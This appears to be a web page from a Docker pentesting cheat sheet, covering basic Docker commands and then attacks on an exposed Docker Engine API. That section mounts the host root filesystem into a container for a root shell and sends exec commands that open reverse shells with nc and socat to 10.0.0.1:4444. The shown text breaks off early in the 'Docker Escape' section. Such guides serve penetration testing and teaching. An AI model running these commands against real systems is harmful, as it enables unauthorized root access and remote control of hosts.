<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Docker Pentesting - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Docker Pentesting", url: "#_top", children: [
              {title: "Investigation", url: "#investigation" },
              {title: "Basic Operations", url: "#basic-operations" },
          ]},
          {title: "Docker Engine API Pentesting", url: "#docker-engine-api-pentesting", children: [
              {title: "Enumeration", url: "#enumeration" },
              {title: "Privilege Escalation from Docker Image", url: "#privilege-escalation-from-docker-image" },
              {title: "Remote Code Execution (RCE)", url: "#remote-code-execution-rce" },
          ]},
          {title: "Docker Escape", url: "#docker-escape", children: [
              {title: "Investigation", url: "#investigation_1" },
              {title: "Mounting", url: "#mounting" },
              {title: "Privilege Escalation to Root", url: "#privilege-escalation-to-root" },
              {title: "Run Vulnerable Docker Image", url: "#run-vulnerable-docker-image" },
              {title: "Download Interesting Files", url: "#download-interesting-files" },
              {title: "Run Existing Docker Image", url: "#run-existing-docker-image" },
              {title: "Docker Socket Escape", url: "#docker-socket-escape" },
              {title: "Establish Persistence After PrivEsc", url: "#establish-persistence-after-privesc" },
              {title: "Amazon Elastic Container Registry (ECR) Public Gallery", url: "#amazon-elastic-container-registry-ecr-public-gallery" },
          ]},
          {title: "Docker Registry Pentesting", url: "#docker-registry-pentesting", children: [
              {title: "Endpoints", url: "#endpoints" },
              {title: "Extract Layers", url: "#extract-layers" },
          ]},
          {title: "Moby Docker Engine PrivEsc", url: "#moby-docker-engine-privesc", children: [
              {title: "1. Find Docker Container Directory", url: "#1-find-docker-container-directory" },
              {title: "2. Prepare SUID Binary in Container", url: "#2-prepare-suid-binary-in-container" },
              {title: "3. Execute the SUID Binary in Real Host", url: "#3-execute-the-suid-binary-in-real-host" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="docker-pentesting">Docker Pentesting</h1>
<p>Docker is a set of platform as a service products that use OS-level virtualization to deliver software in packages called containers.  Default ports are 2375, 2376.</p>
<h2 id="investigation">Investigation</h2>
<h3 id="find-docker-binary">Find Docker Binary</h3>
<p>If we cannot use <code>docker</code> command by default, we need to find the docker binary.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>find / -name &quot;docker&quot; 2&gt;/dev/null
</span></code></pre></div>
<h3 id="basic-commands">Basic Commands</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># List images
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>docker images
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>docker image ls
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a># The history of an image
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>docker image history &lt;image-name&gt;
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a># List containers running
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>docker container ls
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a># or
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>docker ps
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a># List all containers
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>docker container ls -a
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a># or
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>docker ps -a
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a># List secrets
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>docker secret ls
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a># Check configuration of container
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>docker inspect --format=&#39;{{json .Config}}&#39; &lt;container_id_or_name&gt;
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a># Get a port which is used by the container
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>docker port &lt;container_id_or_name&gt;
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a># Scan vulnerabilies (CVEs)
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>docker scan cves &lt;image&gt;
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>docker scan cves alpine
</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>
</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a># View the SBOM (Software Bill of Materials) for an image
</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a># We can investigate vulnerabilities from the list of packages.
</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>docker sbom alpine:latest
</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a># Json format
</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>docker sbom alpine:latest --format syft-json
</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>
</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a># Spawn the shell in the container
</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>docker exec -it &lt;container_id&gt; /bin/bash
</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>
</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a># Kill the running docker container
</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>docker kill &lt;container_id&gt;
</span></code></pre></div>
<h3 id="check-if-containers-running">Check if Containers Running</h3>
<p>In target machine, observe the network status by running <code>netstat</code> or <code>ss</code> command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netstat -punta
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a># or
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>ss -ltu
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a># -------------------------------------------------------
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>tcp  0  0  127.0.0.1:2375  0.0.0.0:*  LISTEN  -
</span></code></pre></div>
<h2 id="basic-operations">Basic Operations</h2>
<h3 id="run-a-new-container">Run a New Container</h3>
<p>First check the docker images listed.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>docker images
</span></code></pre></div>
<p>Then run a new container from the image.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># -d: detached mode (background)
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a># -p: map the port of the host to the port in the container
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>docker run -dp 80:80 &lt;image-name&gt;
</span></code></pre></div>
<p>If you want to run a new container from a remote repository, run the following.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># --rm: Removes the anonymous volumes when the container is removed
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a># -i: interactive
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a># -t: tty
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a># --network=host: The container is not isolated from the Docker host. The IP address is your own home IP address.
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>docker run --rm -it --network=host &lt;repository&gt;/&lt;image&gt;
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a># /bin/bash: spawn a shell within the container
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>docker run -it nginx /bin/bash
</span></code></pre></div>
<h3 id="start-a-container-which-is-stopped">Start a Container which is stopped</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a># List all containers and check the target ID
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>docker container ls -a
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a># Start the container
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>docker container start &lt;container-id&gt;
</span></code></pre></div>
<h3 id="run-commands-in-a-container">Run Commands in a Container</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># List containers running and check the target container ID
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>docker ps
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a># Run commands by giving the container ID
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>docker exec &lt;container-id&gt; whoami
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>docker exec &lt;container-id&gt; cat sample.txt
</span></code></pre></div>
<h3 id="stop-a-container">Stop a Container</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># List running containers and check the target container ID
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>docker ps
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a># Stop the container by giving the ID
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>docker stop &lt;container-id&gt;
</span></code></pre></div>
<h3 id="remove-a-container">Remove a Container</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a># List all containers and check the target container ID
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>docker ps -a
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a># Remove the container by givine the ID
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>docker rm &lt;container-id&gt;
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a># Force to remove the running container (-f)
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>docker rm -f &lt;container-id&gt;
</span></code></pre></div>
<h3 id="build-a-container-image">Build a Container Image</h3>
<p>First off, create a <strong>Dockerfile</strong> in the root directory of the project.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>FROM node:12-alpine
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>RUN apk add --no-cache python2 g++ make
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>WORKDIR /app
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>COPY . .
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>RUN yarn install --production
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>CMD [&quot;node&quot;, &quot;src/index.js&quot;]
</span></code></pre></div>
<p>Now run the following command to build the container image.<br />
This command uses the Dockerfile.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># -t: name a tag of the image
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>docker build -t &lt;tag-name&gt; .
</span></code></pre></div>
<h3 id="scan-a-container-image">Scan a Container Image</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>docker scan &lt;image-name&gt;
</span></code></pre></div>
<h3 id="pull-a-docker-image">Pull a Docker Image</h3>
<p>We need to download a docker image to start a container at first.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>docker pull &lt;image&gt;
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>docker pull nginx
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a># Specify a tag
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>docker pull &lt;image&gt;:&lt;tag&gt;
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>docker pull nginx:latest
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>docker pull nginx:stable
</span></code></pre></div>
<h3 id="remove-a-docker-image">Remove a Docker Image</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># List images and check the target image ID
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>docker images
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a># Remove the image by giving the ID
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>docker rmi &lt;image-id&gt;
</span></code></pre></div>
<h3 id="publish-a-docker-image">Publish a Docker Image</h3>
<p>Before doing below, you need to sign up the Docker Hub and sign in, then create a new repository in your dashboard.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a># Login
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>docker login -u &lt;your-username&gt;
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a># Tag a new image
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>docker tag &lt;source-image&gt; &lt;your-username&gt;/&lt;target-image&gt;
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a># Push
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>docker push &lt;your-username&gt;/&lt;target-image&gt;
</span></code></pre></div>
<h1 id="docker-engine-api-pentesting">Docker Engine API Pentesting</h1>
<p>The Docker Engine API is a RESTfull API accessed by an HTTP client. The default ports are 2375, 2376. The socket file is located at /var/run/docker.sock.</p>
<div class="language-text highlight"><pre><span></span><code>- [engine/api/v1.24](https://docs.docker.com/engine/api/v1.24/)
- [dejandayoff.com](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
</code></pre></div>
<h2 id="enumeration">Enumeration</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl &lt;ip&gt;:2375/containers/json
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a># The specific container
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>curl &lt;ip&gt;:2375/containers/&lt;id or name&gt;/json
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a># Logs
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>curl &lt;ip&gt;:2375/containers/&lt;id or name&gt;/logs?stderr=1&amp;stdout=1
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a># Inpsect changes
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>curl &lt;ip&gt;:2375/containers/&lt;id or name&gt;/changes
</span></code></pre></div>
<h2 id="privilege-escalation-from-docker-image">Privilege Escalation from Docker Image</h2>
<p>We may be able to get a root shell from remote Docker images.</p>
<h3 id="1-check-if-docker-is-running-in-local-machine">1. Check if Docker is Running in Local Machine</h3>
<p>In local machine, check if docker is running.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sudo systemctl status docker
</span></code></pre></div>
<p>If the docker is not running, start it.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo systemctl stop docker
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>sudo systemctl start docker
</span></code></pre></div>
<h3 id="2-list-remote-docker-images">2. List Remote Docker Images</h3>
<p>We need to find what images exist in target Docker API.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>docker -H &lt;target-ip&gt;:2375 images
</span></code></pre></div>
<h3 id="3-get-a-shell">3. Get a Shell</h3>
<p>After getting an image, we can use it to create a new container and run with executing <code>sh</code>.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>docker -H &lt;target-ip&gt;:2375 run -v /:/mnt --rm -it &lt;running-image-name&gt; chroot /mnt sh
</span></code></pre></div>
<p>Now we should get a root shell.</p>
<h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
<p>Reference: <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a></p>
<p>We might be able to execute remote code by create a new container image using the existing one.</p>
<h3 id="1-check-the-image-name">1. Check the Image Name</h3>
<p>First we need to find the existing container image and the name of it.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>curl &lt;ip&gt;:2375/containers/json
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>curl &lt;ip&gt;:2375/containers/&lt;id or name&gt;/json
</span></code></pre></div>
<h3 id="2-createstart-a-new-container">2. Create/Start a New Container</h3>
<p>If we found the container image name, prepare a new container configuration named “image.json”.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>{
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>  &quot;Image&quot;: &quot;sweettoothinc:latest&quot;,
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>  &quot;Cmd&quot;: [&quot;/bin/bash&quot;],
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>  &quot;Binds&quot;: [&quot;/:/mnt:rw&quot;]
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>}
</span></code></pre></div>
<p>Then create a new container using Docker Engine API.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>curl -X POST -H &quot;Content-Type: application/json&quot; -d @image.json &lt;ip&gt;:2375/containers/create
</span></code></pre></div>
<p>We get the new container ID, so copy it.</p>
<p>After that, start the new container.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>curl -X POST &lt;ip&gt;:2375/containers/&lt;new_container_id&gt;/start
</span></code></pre></div>
<h3 id="3-create-a-new-exec-instance">3. Create a New Exec Instance</h3>
<p>Next create a exec instance to reverse shell.</p>
<ul>
<li><strong>Ncat</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>    curl -X POST -H &quot;Content-Type: application/json&quot; --data-binary &#39;{&quot;AttachStdin&quot;: true, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;nc&quot;, &quot;10.0.0.1&quot;, &quot;4444&quot;, &quot;-e&quot;, &quot;/bin/bash&quot;], &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;, &quot;Privileged&quot;: true, &quot;Tty&quot;: true}&#39; &lt;ip&gt;:2375/containers/&lt;new_container_id&gt;/exec
</span></code></pre></div>
<ul>
<li><strong>Socat</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>    curl -X POST -H &quot;Content-Type: application/json&quot; --data-binary &#39;{&quot;AttachStdin&quot;: true, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;socat&quot;, &quot;TCP:10.0.0.1:4444&quot;, &quot;EXEC:sh&quot;], &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;, &quot;Privileged&quot;: true, &quot;Tty&quot;: true}&#39; &lt;ip&gt;:2375/containers/&lt;new_container_id&gt;/exec
</span></code></pre></div>
<p>We get a exec ID, so copy it.</p>
<h3 id="4-start-an-exec-instance-reverse-shell">4. Start an Exec Instance &amp; Reverse Shell</h3>
<p>Start a listener in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>nc -lvnp 4444
</span></code></pre></div>
<p>Now start an exec instance and get a shell.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>curl -X POST -H &quot;Content-Type: application/json&quot; --data-binary &#39;{&quot;Detach&quot;: false, &quot;Tty&quot;: false}&#39; &lt;ip&gt;:2375/exec/&lt;exec_id&gt;/start
</span></code></pre></div>
<p>We should get a shell.</p>
<h1 id="docker-escape">Docker Escape</h1>
<p>Docker escape refers to a security vulnerability that could potentially allow an attacker to break out of a Docker container and gain access to the host system or other containers running on the same host.</p>
<div class="language-text highlight"><pre><span></span><code>- [hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)
- [PwnPeter](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25)
</code></pre></div>
<h2 id="investigation_1">Investigation</h2>
<p>If we are in the docker container, we first need to investigate basic information about the container.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># Environment variables
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>env
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a># Command path
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>echo $PATH
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>ls -al /usr/local/bin
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>ls -al /usr/local/sbin
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>ls -al /usr/bin
